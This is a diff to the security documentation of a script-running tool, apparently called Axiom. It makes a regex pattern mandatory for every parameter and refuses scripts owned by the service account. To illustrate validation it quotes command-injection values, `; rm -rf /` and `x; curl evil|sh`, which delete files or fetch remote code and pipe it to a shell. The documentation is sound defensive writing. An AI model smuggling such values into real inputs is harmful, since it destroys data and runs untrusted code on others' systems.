@@ -70,11 +70,15 @@ set -euo pipefail
 echo "deploying image tag: $AXIOM_PARAM_IMAGE_TAG"
 ```
 
-A value like `; rm -rf /` either fails its declared pattern (rejected
-outright) or, if a parameter genuinely has no pattern, arrives as an inert
-string in the environment — it can only become dangerous if the script
-itself does something unsafe with it (e.g. `eval`s it). Always declare a
-pattern for anything that reaches a script.
+Every declared parameter must have a `pattern`; a config without one fails
+to load. The pattern is always matched against the **whole** value (Axiom
+compiles it as `^(?:pattern)$`), so `[a-z]+` rejects `x; curl evil|sh`
+exactly as `^[a-z]+$` does.
+
+A value like `; rm -rf /` that fails its pattern is rejected outright. One
+that passes still arrives as an inert string in the environment — it can only
+become dangerous if the script itself does something unsafe with it (e.g.
+`eval`s it), so keep patterns as narrow as the parameter allows.
 
 ## Scripts must be protected from local modification
 
@@ -85,8 +89,9 @@ recommendation:
 - it must not be a symlink,
 - it must exist, be a regular file, and be executable,
 - it (and every directory above it, all the way to `/`) must be owned by
-  root or the Axiom service account, and must not be group- or
-  world-writable.
+  root, and must not be group- or world-writable. A script owned by the
+  Axiom service account is refused (that account could rewrite it); the
+  development-only `security.allow_service_owned_files: true` lifts this.
 
 Axiom **refuses to start** if any configured action's script fails this
 check — this is deliberately a hard failure, not a warning, because a
